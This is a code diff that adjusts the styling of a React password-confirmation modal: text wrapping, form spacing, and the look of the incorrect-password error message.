@@ -124,8 +124,8 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                             </div>
                             <div className='w-full'>
                                 <div className='mb-[20px] text-left w-full'>
-                                    <p className='text-[#65676b] text-[15px] font-normal leading-[1.3] pt-[2px] whitespace-pre-line'>
-                                        {t('For your security, you must enter your password to continue.').replace(' you must ', ' you must\n')}
+                                    <p className='text-[#65676b] text-[15px] font-normal leading-[1.3] pt-[2px] break-words'>
+                                        {t('For your security, you must enter your password to continue.')}
                                     </p>
                                 </div>
                                 <form
@@ -133,7 +133,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                                         e.preventDefault();
                                         handleSubmit();
                                     }}
-                                    className='flex flex-col gap-[20px]'
+                                    className='flex flex-col gap-[12px]'
                                 >
                                     <div className='w-full'>
                                         <div className='input relative w-full border border-[#d4dbe3] h-[46px] px-[12px] rounded-[10px] bg-white text-[15px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] transition-all duration-200'>
@@ -156,7 +156,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                                             </button>
                                         </div>
                                         {showError && (
-                                            <p className='text-[#fa383e] text-[12px] mt-[6px] ml-[2px] text-left animate-shake font-normal leading-tight whitespace-nowrap tracking-tight'>
+                                            <p className='text-[#fa383e] text-[13px] mt-[8px] text-center animate-shake font-medium leading-tight whitespace-nowrap'>
                                                 {t("The password that you've entered is incorrect.")}
                                             </p>
                                         )}
